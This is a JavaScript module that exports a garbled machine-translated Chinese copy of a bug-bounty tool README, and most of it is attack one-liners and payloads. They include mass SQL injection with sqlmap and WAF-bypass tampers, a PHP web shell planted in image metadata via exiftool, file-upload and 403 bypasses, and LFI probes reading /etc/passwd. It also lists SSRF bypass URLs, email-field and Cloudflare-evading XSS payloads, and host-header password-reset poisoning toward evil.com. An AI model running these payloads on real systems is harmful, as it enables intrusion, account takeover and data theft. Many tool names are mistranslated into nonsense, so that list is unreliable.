const n=`https://github.com/0xJin/awesome-bugbounty-builder

# **\u5F88\u68D2\u7684 Bug Bounty Builder \xAF\\\\ *(\u30C4)* /\xAF**

**GitHub \u5206\u53C9** GitHub \u8BB8\u53EF\u8BC1 GitHub \u661F\u661F  
*\u5F88\u68D2\u7684 Bug \u8D4F\u91D1\u6784\u5EFA\u5668\u9879\u76EE \\- \u7528\u4E8E\u67E5\u627E\u6F0F\u6D1E\u7684\u6240\u6709\u5E38\u7528\u5DE5\u5177\u3002*  
\u5728 Debian \u4E0A\u6D4B\u8BD5\u3002  
![bb][image1]  
---

## **\u5B89\u88C5\uFF1A**

$ git clone https://github.com/0xJin/awesome-bugbounty-builder.git  
$ cd awesome-bugbounty-builder/  
$ chmod \\+x awesome-bugbounty-build.sh  
$ ./awesome-bugbounty-builder.sh

## **\u60A8\u5C06\u5728\u8FD9\u91CC\u627E\u5230\u7684\u5DE5\u5177**

* \u805A\u96C6  
* \u5B50\u5217\u8868  
* \u52A0\u4E4C\u666E\u9C81\u65AF  
* HTTPX  
* Gf \\+ \u56FE\u6848  
* \u97D3\u570B  
* sqlmap  
* \u5EB7\u5BC6\u514B\u65AF  
* \u62D3\u6251\u56FE  
* \u4E5D\u5934\u86C7  
* \u5F00\u819B\u624B\u7EA6\u7FF0  
* \u90AA\u6076\u529B\u91CF  
* \u963F\u743C  
* \u8718\u86DB\u4FA0  
* NoSQL\u5730\u56FE  
* \u7F51\u7EDC\u6620\u5C04  
* \u5C3C\u514B\u6258  
* \u6C1F\u5316\u6C22\u6C1F\u9178  
* 403-\u7ED5\u8FC7  
* \u6208\u5E03\u65AF\u7279  
* \u585E\u514B\u5229\u65AF  
* \u54C8\u5E0C\u6807\u8BC6\u7B26  
* \u8DE8\u5E73\u53F0\u6570\u636E\u6620\u5C04  
* \u8D70\u79C1\u8005  
* SSRF\u5730\u56FE  
* Gmapsapiscanner  
* \u66FF\u6362  
* \u5916\u7F6E\u5DE5\u5177  
* XSRFProbe  
* XXE \u6F0F\u6D1E\u5229\u7528\u8005  
* Rust \u626B\u63CF  
* \u4F4E\u9891\u97F3\u9891\u5957\u4EF6  
* \u9E8B\u9E7F  
* \u539F\u5B50\u6838+\u6A21\u677F  
* \u5C3F\u8DEF\u611F\u67D3  
* \u9891\u7387  
* \u82CF\u6BD4  
* \u5F00\u653E\u7EA2\u8FEA\u7F51  
* \u53E4\u592B\u5179  
* \u500D\u589E\u5668  
* \u6A21\u7CCA\u67E5\u8BE2\u8BED\u8A00  
* \u7F8E\u5206  
* \u8389\u83F2  
* SSRF \u5DE5\u5177  
* \u4FE1\u606F\u7F51  
* \u9AD8\u91CC

---

## **Bug Bounty \u63D0\u793A\u548C\u5DE5\u5177\u4F7F\u7528 \\+ \u5355\u884C\u63D0\u793A\uFF1A**

### **FUZZ XSS \u7684\u5355\u884C*\u4FA6\u5BDF\uFF1A***

$ amass enum \\-brute \\-passive \\-d example.com | httpx \\-silent \\-status-code | tee domain.txt  
$ cat domain.txt | gauplus \\-random-agent \\-t 200 | gf xss | kxss | tee domain2.txt  
$ cat domain.txt | gauplus \\-random-agent \\-t 200 | gf xss | uro | qsreplace '"\\>\\<img src=x onerror=prompt('jin');\\>' | freq  
---

### ***\u4F7F\u7528FUFF*** **ONE-LINER\u5BF9\u6240\u6709\u5B50\u57DF\u540D\u8FDB\u884C FUZZ \u5904\u7406\uFF1A**

$ amass enum \\-brute \\-passive \\-d http://example.com | sed 's\\#\\*.\\# \\#g' | httpx \\-silent \\-threads 10 | xargs \\-I@ sh \\-c 'ffuf \\-w wordlist.txt \\-u @/FUZZ \\-mc 200'  
---

### ***\u4F7F\u7528FUFF*** **ONE-LINER\u8FDB\u884C\u547D\u4EE4\u6CE8\u5165\uFF1A**

$ cat subdomains.txt | httpx \\-silent \\-status-code | gauplus \\-random-agent \\-t 200 | qsreplace \u201Caaa%20%7C%7C%20id%3B%20x\u201D \\> fuzzing.txt  
$ ffuf \\-ac \\-u FUZZ \\-w fuzzing.txt \\-replay-proxy 127.0.0.1:8080  
// search for \u201Duid\u201D in burp proxy intercept   
// You can use the same query for search SSTI in qsreplase add "{{7\\*7}}" and search on burp for '49'  
---

### **SQL\u6CE8\u5165\u6280\u5DE7\uFF1A**

// \\*\\*MASS SQL injection\\*\\*  
$ amass enum \\-brute \\-passive \\-d example.com | httpx \\-silent \\-status-code | tee domain.txt  
$ cat domain.txt | gauplus \\-random-agent \\-t 200 | gf sqli | tee domain2.txt  
$ sqlmap \\-m domain2.txt \\-dbs \\--batch \\--random-agent  
$ subfinder \\-dL domains.txt | dnsx | waybackurl | uro  | grep "\\\\?" | head \\-20 | httpx \\-silent \\> urls;sqlmap \\-m urls \\--batch \\--random-agent \\--level 1 | tee sqlmap.txt  
// \\*\\*SQL Injection headers\\*\\*  
$ sqlmap \\-u "http://redacted.com" \\--header="X-Forwarded-For: 1\\*" \\--dbs \\--batch \\--random-agent \\--threads=10  
// \\*\\*SQL Injection bypass 401\\*\\*  
$ sqlmap \\-u "http://redacted.com" \\--dbs \\--batch \\--random-agent \\--forms \\--ignore-code=401

// PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper  
\\--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase  
---

### **XSS \\+ SQLi \\+ CSTI/SSTI**

Payload: '"\\>\\<svg/onload=prompt(5);\\>{{7\\*7}}  
---

### **EXIFTOOL \\+ \u6587\u4EF6\u4E0A\u4F20\u63D0\u793A\uFF1A**

$ exiftool \\-Comment="\\<?php echo 'Command:'; if($\\_POST){system($\\_POST\\['cmd'\\]);} \\_\\_halt\\_compiler();" img.jpg  
// File Upload bypass  
file.php%20  
file.php%0a  
file.php%00  
file.php%0d%0a  
file.php/  
file.php.\\\\  
file.  
file.php....  
file.pHp5....  
file.png.php  
file.png.pHp5  
file.php%00.png  
file.php\\\\x00.png  
file.php%0a.png  
file.php%0d%0a.png  
flile.phpJunk123png  
file.png.jpg.php  
file.php%00.png%00.jpg  
---

### **\u6253\u5F00\u91CD\u5B9A\u5411\u63D0\u793A\u4E00\u884C\uFF1A**

$ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs \\-I % \\-P 25 sh \\-c 'curl \\-Is "%" 2\\>&1 | grep \\-q "Location: $LHOST" && echo "VULN\\! %"'  
---

### **LFI \u5355\u884C\uFF1A**

$ gauplus \\-random-agent \\-t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs \\-I% \\-P 25 sh \\-c 'curl \\-s "%" 2\\>&1 | grep \\-q "root:x" && echo "VULN\\! %"'  
$ assetfinder \\-subs-only target.com | httpx \\-silent \\-nc \\-p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 \\-path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" \\-mr "root:x:" \\-t 60  
$ cat domains.txt | gauplus \\-random-agent \\-t 10 | gf lfi | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx \\-silent \\-nc \\-mr "root:x:" \\-t 250  
---

### **\u6700\u4F73 SSRF \u7ED5\u8FC7\u65B9\u6CD5\uFF1A**

http://127.1/  
http://0000::1:80/  
http://\\[::\\]:80/  
http://2130706433/  
http://whitelisted@127.0.0.1  
http://0x7f000001/  
http://017700000001  
http://0177.00.00.01

### **\u4F7F\u7528\u6B64\u5DE5\u5177\u7684\u6700\u4F73 SSRF \u6280\u5DE7\uFF1A**

$ amass enum \\-passive \\-brute \\-d yahoo.com \\-silent | httpx \\-silent | tee domains.txt | ssrf-tool \\-domains domains.txt \\-payloads payloads.txt \\-silent=false \\-paths=true \\-patterns patterns.txt  
$ echo "twitter.com" | gauplus \\-random-agent \\-t 100 | tee domains.txt; ssrftool \\-domains domains.txt \\-silent=false \\-paths=false \\-payloads payloads.txt  
---

### **\u7535\u5B50\u90AE\u4EF6\u653B\u51FB\uFF1A**

// \\*\\*Header Injection\\*\\*  
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com  
"recipient@test.com\\>\\\\r\\\\nRCPT TO:\\<victim+"@test.com  
// \\*\\*XSS Injection\\*\\*  
test+(\\<script\\>alert(0)\\<\/script\\>)@example.com  
test@example(\\<script\\>alert(0)\\<\/script\\>).com  
"\\<script\\>alert(0)\\<\/script\\>"@example.com  
// \\*\\*SST Injection\\*\\*  
"\\<%= 7 \\* 7 %\\>"@example.com  
test+(\${{7\\*7}})@example.com  
// \\*\\*SQL Injection\\*\\*  
"' OR 1=1 \\-- '"@example.com  
"mail'); SLEEP(5);--"@example.com  
// \\*\\*SSRF Attack\\*\\*  
john.doe@abc123.burpcollaborator.net  
john.doe@\\[127.0.0.1\\]  
---

### **\u56FE\u50CF\u7684 XSS \u8D1F\u8F7D**

\\<img src=x onerror=alert('XSS')\\>.png  
"\\>\\<img src=x onerror=alert('XSS')\\>.png  
"\\>\\<svg onmouseover=alert(1)\\>.svg  
\\<\\<script\\>alert('xss')\\<\\!--a--\\>a.png  
---

### **\u4F7F\u7528\u9ED8\u8BA4\u89C4\u5219\u7ED5\u8FC7 CLOUDFLARE \u7684 XSS**

"/\\>\\<svg+svg+svg\\\\/\\\\/On+OnLoAd=confirm(1)\\>  
---

### **\u5728 javascript \u6587\u4EF6\u4E2D\u67E5\u627E\u9690\u85CF\u7684\u53C2\u6570\uFF1A**

$ amass enum \\-passive \\-brute \\-d redacted.com | gau | egrep \\-v '(.css|.svg)' | while read url; do vars=$(curl \\-s $url | grep \\-Eo "var \\[a-zA-Z0-9\\]+" | sed \\-e 's,'var','"$url"?',g' \\-e 's/ //g' | grep \\-v '.js' | sed 's/.\\*/&=xss/g'); echo \\-e "\\\\e\\[1;33m$url\\\\n\\\\e\\[1;32m$vars"; done  
---

### **IDOR \u5FEB\u901F\u5B9E\u73B0\u8D26\u6237\u63A5\u7BA1\uFF1A**

\\~Create an account   
\\~In the reset field set a password and intercept with burp  
\\~GET /user/2099/reset (change to 2098\\) send the request  
\\~Take the token   
\\~Cookie editor and use this token  
\\~Reload page  
---

### **\u5BF9\u4E8E API \u5BC6\u94A5\uFF1A**

$ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.

### **\u4F7F\u7528 GF \u5DE5\u5177\u67E5\u627E\u654F\u611F\u4FE1\u606F\uFF1A**

$ gauplus redacted.com \\-subs | cut \\-d"?" \\-f1 | grep \\-E "\\\\.js+(?:on|)$" | tee domains.txt  
sort \\-u domains.txt | fff \\-s 200 \\-o out/  
$ for i in \\\`gf \\-list\\\`; do \\[\\[ \${i} \\=\\~ "\\_secrets"\\* \\]\\] && gf \${i}; done  
---

### **\u901A\u8FC7\u6DFB\u52A0\u4EE5\u4E0B\u5185\u5BB9\u7ED5\u8FC7 RATE-LIMIT\uFF1A**

X-Originating-IP: IP  
X-Forwarded-For: IP  
X-Remote-IP: IP  
X-Remote-Addr: IP  
X-Client-IP: IP  
X-Host: IP  
X-Forwared-Host: IP  
---

### **\u4F7F\u7528 FFUF \u548C GAUPLUS \u67E5\u627E\u8BBF\u95EE\u4EE4\u724C\uFF1A**

$ cat domains.txt | sed 's/https\\\\?:\\\\/\\\\///' | gau \\> domains2.txt  
$ cat domains2.txt | grep \\-P "\\\\w+\\\\.js(\\\\?|$)" | sort \\-u \\> jsurls.txt  
$ ffuf \\-mc 200 w jsurls.txt:HFUZZ \\-u HFUZZ \\-replay-proxy http://127.0.0.1:8080  
// Use Scan Check Builder Burp extension, add passive profile to extract \u201CaccessToken\u201D or \u201Caccess\\_token\u201D  
// Extract found tokens and validate with https://github.com/streaak/keyhacks  
---

### **\u67E5\u627E CORS \u6F0F\u6D1E\uFF1A**

$ amass enum \\-d redacted.com | httpx \\-threads 300 \\-follow-redirects \\-silent | rush \\-j200 'curl \\-m5 \\-s \\-I \\-H "Origin: evil.com" {} | \\[\\[ $(grep \\-c "evil.com") \\-gt 0 \\]\\] && printf "\\\\n3\\[0;32m\\[VUL TO CORS\\] 3\\[0m{}"' 2\\>/dev/null  
---

### **\u7ED5\u8FC7 403 \u548C 401\uFF1A**

X-Original-URL: /admin  
X-Override-URL: /admin  
X-Rewrite-URL: /admin

---

### **Web\u7F13\u5B58\u6B3A\u9A97\uFF1A**

[https://hackerone.com/reports/397508](https://hackerone.com/reports/397508)  
---

### **Web \u7F13\u5B58\u4E2D\u6BD2\uFF1A**

[https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerability-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)  
---

### **\u7ED5\u8FC7\u5BC6\u7801\u4E2D\u6BD2\u6765\u63A5\u7BA1\u5E10\u6237\uFF1A**

// Request  
POST https://target.com/password-reset?user=123 HTTP/1.1  
Host: evil.com

// If you receive a link this works\\!

---

### **\u6700\u4F73\u8BCD\u6C47\u8868\uFF1A**

https://github.com/six2dez/OneListForAll/releases  
https://github.com/Karanxa/Bug-Bounty-Wordlists

---

## **\u8C22\u8C22**

**![\u7ED9\u6211\u4E70\u676F\u5496\u5561][image2]**  
\u522B\u5FD8\u4E86\u5728 Twitter \u4E0A\u5173\u6CE8\u6211\u3002  
[@0xJin](https://twitter.com/0xJin) \\- \u8BE5\u5DE5\u5177\u7531 0xJin \u7528\u2764\uFE0F\u5236\u4F5C \xAF\\\\ *(\u30C4)* /\xAF\u3002  


[image1]: https://user-images.githubusercontent.com/81621963/147457586-79ac41eb-f995-455b-a144-f80a5783047a.PNG

[image2]: https://camo.githubusercontent.com/8ca6cbc30815bc3ef458755d26604c424652dc18a51df3b3d708126667c31c91/68747470733a2f2f63646e2e6275796d6561636f666665652e636f6d2f627574746f6e732f76322f64656661756c742d7265642e706e67 
`;export{n as _};
